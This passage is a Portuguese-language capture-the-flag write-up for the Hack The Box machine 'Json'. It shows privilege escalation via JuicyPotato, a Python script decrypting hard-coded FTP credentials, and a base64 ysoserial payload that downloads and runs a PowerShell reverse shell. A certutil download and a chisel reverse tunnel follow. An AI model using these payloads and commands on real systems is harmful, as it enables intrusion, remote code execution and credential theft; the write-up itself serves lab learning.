`JuicyPotato.exe -t * -p shell.bat -l 443 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'`

Ganhamos um shell de authority

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_r.png)

Agora vamos aumentar um pouco o nível de dificuldade

# 2º Modo - Sync2FTP

Agora vamos analisar essa aplicação maluca que tem instalada na máquina, a `Sync2FTP`, copiamos todos os arquivos dela para nosso compartilhamento

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync1.png)

Verificamos o que temos no arquivo de configuração dele, vemos que temos login e senha, os dois estão em base64 mas não estão em ASCII, ou seja, não consigo ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync2.png)

Agora irei mudar a máquina Windows, a Comando, passei os arquivos para ela para poder analisar de lá, o executável e o arquivo de configuração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync3.png)

## Instalação do DNSPY

Agora instalamos o DNSPY para debugar essa aplicação, a ideia dele é a mesma do Ghidra para Linux

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync4.png)

Abrimos a aplicação o DNSPY

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync5.png)

## Decompilação do binário

Vamos iniciar a decompilar ele, começamos pela função `Program.Main()`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync6.png)

Ele nos remete ao `Service1`, creio que seja interessante olharmos nele, verificando ele, ali está que ele decripta a senha e o usuário, na função `Copy()`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync7.png)

Aqui podemos fazer de duas maneiras pra descobrir essa senha e login, uma delas é recriar a função em um script python (assim como o 0xdf fez) ou colocar dentro do binário mesmo pra ele fazer, e recompilar ele de modo que quando eu executo, ela me da em uma box o login e senha (como o ippsec fez), bom, vamos fazer as duas!

### Descobrindo através de box message

Colocamos ela no main e acrescentamos uma box para nos mostrar a senha. Abrimos ele em Edit Code (C)

Adicionamos o código

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync8.png)

Adicionamos a chamada da box

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync9.png)

Adicionamos as duas funções, pra ele ler a senha e printar na box

```
using System.Windows.Forms;
using System.Configuration;
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync10.png)

Agora clicamos em `Compile`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync11.png)

File - Save All

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync12.png)

Salvamos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync13.png)

Agora executamos o executável novamente, e temos as credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_sync14.png)

`superadmin:funnyhtb`

Não sei aonde tem funny ai, máquina difícil pra caramba, mas tudo bem... vamo lá

### Descobrindo através de script

Outro modo de se conseguir essas credenciais é o modo que o `0xdf` fez, através de um script em python

Verificamos a função `Copy()`

```
// SyncLocation.Service1
// Token: 0x0600000B RID: 11 RVA: 0x000023D0 File Offset: 0x000005D0
private void Copy()
{
	try
	{
		string path = ConfigurationManager.AppSettings["destinationFolder"];
		string text = ConfigurationManager.AppSettings["sourcefolder"];
		string cipherString = ConfigurationManager.AppSettings["user"];
		string cipherString2 = ConfigurationManager.AppSettings["password"];
		string userName = Crypto.Decrypt(cipherString, true);
		string password = Crypto.Decrypt(cipherString2, true);
		bool flag = Directory.Exists(text);
		if (flag)
		{
			string[] files = Directory.GetFiles(text);
			foreach (string text2 in files)
			{
				FileInfo fileInfo = new FileInfo(text2);
				string requestUriString = Path.Combine(path, fileInfo.Name);
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(userName, password);
				ftpWebRequest.UsePassive = true;
				ftpWebRequest.UseBinary = true;
				ftpWebRequest.KeepAlive = false;
				this.Log("Upload File " + fileInfo.Name);
				FileStream fileStream = File.OpenRead(text2);
				byte[] array2 = new byte[fileStream.Length];
				fileStream.Read(array2, 0, array2.Length);
				fileStream.Close();
				Stream requestStream = ftpWebRequest.GetRequestStream();
				requestStream.Write(array2, 0, array2.Length);
				requestStream.Close();
			}
		}
		else
		{
			this.Log("The directory " + text + " not exits.");
		}
	}
	catch (Exception ex)
	{
		this.Log(ex.ToString());
	}
}
```

No topo da função, podemos ver cipherString e cipherString2 usando o ConfigurationManager.AppSetings. A partir disso é gerado o username e password encriptado pela chamada da Crypto.Decrypt

```
string cipherString = ConfigurationManager.AppSettings["user"];
string cipherString2 = ConfigurationManager.AppSettings["password"];
string userName = Crypto.Decrypt(cipherString, true);
string password = Crypto.Decrypt(cipherString2, true);
```

Humm... vamos dar uma olhada na chamada do Decrypt() dentro do Crypto

```
// SyncLocation.Crypto
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
public static string Decrypt(string cipherString, bool useHashing)
{
	byte[] array = Convert.FromBase64String(cipherString);
	AppSettingsReader appSettingsReader = new AppSettingsReader();
	string s = (string)appSettingsReader.GetValue("SecurityKey", typeof(string));
	byte[] key;
	if (useHashing)
	{
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
		md5CryptoServiceProvider.Clear();
	}
	else
	{
		key = Encoding.UTF8.GetBytes(s);
	}
	TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
	tripleDESCryptoServiceProvider.Key = key;
	tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
	tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
	ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
	byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
	tripleDESCryptoServiceProvider.Clear();
	return Encoding.UTF8.GetString(bytes);
```

Como funciona isso? Tem um base64 decode a cifra em bytes, é carregada a SecurityKey, e a função useHashing é habilitada. Ele faz um MD5 da string para pegar a chave, ai ele decrypta com DES Triplo usando o modo ECB

Podemos reescrever essa função em python (não fui em quem fiz o código, peguei do 0xdf)

json.py
```
 #!/usr/bin/env python3
 
 import base64
 import hashlib
 from Crypto.Cipher import DES3
 from Crypto.Util.Padding import unpad
 
 user_enc = "4as8gqENn26uTs9srvQLyg=="
 pass_enc = "oQ5iORgUrswNRsJKH9VaCw=="
 key_str = b"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"
 
 def decrypt(s):
     ciphertext = base64.b64decode(s)
     key = hashlib.md5(key_str).digest()
     des = DES3.new(key, DES3.MODE_ECB)
     return unpad(des.decrypt(ciphertext), 8).decode()
  
 print(f'[+] Username: {decrypt(user_enc)}')
 print(f'[+] Password: {decrypt(pass_enc)}')
 ```

Executando o código, ai está a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python.png)

Show, com essa senha conseguimos apenas logar no FTP, não conseguimos fazer psexec nem wmiexec nem nada disso, o que é foda. Mas ta bom, vamos prosseguir

Logamos no FTP e pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python2.png)

Tentamos executar o psexec mas sem sucesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python3.png)

Adicionamos no hosts o json. Tentamos também o winrm, mas também sem sucesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_python6.png)

Agora vamos para o último, vamos ver o que tem rodando naquela porta maluca que só roda localmente

# 3º Modo - PortForwading - Chisel

Agora iremos realizar o Port Fowarding daquela porta 14147 que está rodando localmente

Para isso devemos utilizar a conexão na máquina Windows. Ganhamos um shell na Comando, como foi feito anteriormente na Kali

Abrimos o Nishang nele e colcamos a chamada para nosso IP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c1.png)

Agora preparamos o base64 que vai ser enviado para o servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c3.png)

Ai está

`ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLAogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsCiAgICAnTWV0aG9kUGFyYW1ldGVycyc6ewogICAgICAgICckdHlwZSc6J1N5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OScsCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBvd2Vyc2hlbGwgLUVuY29kZWRDb21tYW5kIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBWkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURFQU1BQXVBREVBTUFBdUFERUFOZ0F1QURFQU1RQTNBQzhBU1FCdUFIWUFid0JyQUdVQUxRQlFBRzhBZHdCbEFISUFVd0JvQUdVQWJBQnNBRlFBWXdCd0FDNEFjQUJ6QURFQUp3QXBBQT09J10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0K`

Agora ligamos o listener na porta 443 e o python web server

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c4.png)

Agora abrimos a página do Json (lembrar de ter o VPN ligada na Windows - e para isso desligar a da Kali)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c5.png)

A diferença que vamos usa o F12 do Firefox pra realizar o envio do base64 do ysoserial, não pelo burp suite. Clicamos em Edit e Send a requisição GET para o /api/Account e após isso colocamos o valor do base64 no Bearer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c7.png)

E ao enviar, recebemos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c8.png)

## PortForwading Chisel

Para realizar o Port Forwading da porta especificada, vamos utilizar o `Chisel`

> https://github.com/jpillora/chisel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c10.png)

Baixamos ele na nossa máquina Comando

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c11.png)

Agora passamos o executável para a máquina através do wget e um python web server, vamos salvar na pasta `C:\windows\system32\spool\drivers\color`, ele demora um pouco a passar tendo em vista o tamanho do arquivo

`certutil -urlcache -split -f http://10.10.16.117:8000/chisel.exe chisel.exe`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c12.png)

Executamos na máquina host (Comando VM) o comando para receber a porta da máquina invadida na minha porta 8000

`.\chisel.exe server --host 10.10.16.117 --port 8000 --reverse`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c13.png)

Na máquina invadida digito o comando para enviar a conexão da porta

`.\chisel.exe client 10.10.16.117:8000 R:14148:127.0.0.1:14147`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c14.png)

Verifico que recebi a conexão, a porta já está pivoteada para minha máquina. Verifico na minha host que a porta 14148 está aberta e recebendo a conexão da porta 14147 da máquina invadida

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c15.png)

Baixo o FileZilla (é um cliente FTP pra poder conectar no servidor)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c16.png)

Instalo ele na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c17.png)

Ao abrir ele mudar a porta local 14147 (padrão) pela 14148 (que é a local que está escutando o port forwading)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c18.png)

Clico em Users e Adiciono um usuário novo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c19.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c20.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c21.png)

Compartilho o C: com ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c22.png)

Tento entrar por linha de comando no C: que foi compartilhado e verifico que tenho acesso ao disco C: do admin

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_c23.png)

Aqui eu posso pegar a flag e tudo mais...

Aqui também da pra ser explorada a falha do `DiagHub`, mas eu ainda não sei como explorar ela corretamente, quando fizer a máquina RE ou a Hackback eu volto aqui (se lembrar) e atualizo

> https://github.com/decoder-it/diaghub_exploit

O `0xdf` explicou mais ou menos como explora isso, se ficar interessado, leia o blog dele

## Agora pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_root.png)